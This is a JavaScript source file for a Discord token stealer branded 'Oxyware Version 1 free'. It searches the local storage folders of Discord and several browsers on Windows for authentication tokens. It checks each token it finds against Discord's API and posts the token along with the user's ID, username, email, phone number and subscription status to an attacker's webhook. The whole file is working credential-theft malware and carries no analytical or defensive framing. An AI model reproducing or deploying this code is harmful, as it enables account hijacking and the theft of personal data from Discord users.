const fs = require('fs')
const axios = require('axios')
const fetch = require('node-fetch')

var webhook = ""

var paths = [
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
]

for (i = 0; i < paths.length; i++) {
    get_token(paths[i])
}

async function get_token(path) {
    try {
        fs.readdir(path, (err, files) => {
            if (files === undefined) {
                return
            }

            var filtro = files.filter(f => f.split('.').pop() === "ldb")
            for (i = 0; i < filtro.length; i++) {
                fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                    let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                    let regex2 = /"mfa\.[\d\w_-]{84}"/;

                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, '')
                        console.log(match);
                        await fetch(`https://discord.com/api/v6/users/@me`, {
                            headers: {
                                "authorization": match
                            }
                        }).then(resp => resp.json()).then(response => {
                            if (response.id) {
                                if (!response.premium_type) {
                                    nitro = "Sem nitro"
                                } else {
                                    if (response.premium_type === 1) { nitro = "Nitro Classic" }
                                    if (response.premium_type === 2) { nitro = "Nitro Gaming" }
                                }
                                send(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro, response.avatar)
                            }
                        })
                    }
                })
            }
        })

        fs.readdir(path, (err, files) => {
            if (files === undefined) {
                return
            }
            var filtro = files.filter(f => f.split('.').pop() === "log")
            for (i = 0; i < filtro.length; i++) {
                fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                    let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                    let regex2 = /"mfa\.[\d\w_-]{84}"/;

                    if (regex1.test(data)) {

                    }
                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, '')
                        console.log(match)
                        await fetch(`https://discord.com/api/v6/users/@me`, {
                            headers: {
                                "authorization": match
                            }
                        }).then(resp => resp.json()).then(response => {
                            if (response.id) {
                                if (!response.premium_type) {
                                    nitro = "Sem nitro"
                                } else {
                                    if (response.premium_type === 1) { nitro = "Nitro Classic" }
                                    if (response.premium_type === 2) { nitro = "Nitro Gaming" }
                                }
                                send(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro)
                            }
                        })
                    }
                })
            }
        })


    } catch (err) {
        console.log(err)
    }
}

function send(token, id, username, tag, email, phone, nitro, avatar) {
    if (email === null) {
        email = "Sem email"
    }
    if (phone === null) {
        phone = "Sem telefone"
    }
    if (avatar === null) {
        avatar = "https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg"
    } else {
        avatar = `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`
    }
    axios.post(webhook, {
        "embeds": [
            {
                "color": 1127128,
                "author": {
                    "name": `${username}`,
                    "icon_url": `${avatar}`
                },
                "thumbnail": {
                    "url": `${avatar}`
                },
                "description": `**TOKEN**\n\n${token}\n\n**ID**\n\n${id}\n\n**USERNAME**\n\n${username}#${tag}\n\n**EMAIL**\n\n${email}\n\n**PHONE**\n\n${phone}\n\n**NITRO**\n\n${nitro}`,
            }
        ], "username": "Oxyware Version 1 free", "avatar_url": "https://images-ext-2.discordapp.net/external/B4oFamfEYyF5a2IZk_Ef3RnDA9VHiY4orjoKp_LBZ00/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/621402634821042196/a0b719d919e2176f9603f3c3e84ad801.png?width=90&height=90"
    }, {
        headers: {
            'Content-Type': 'application/json',
        },
    })
}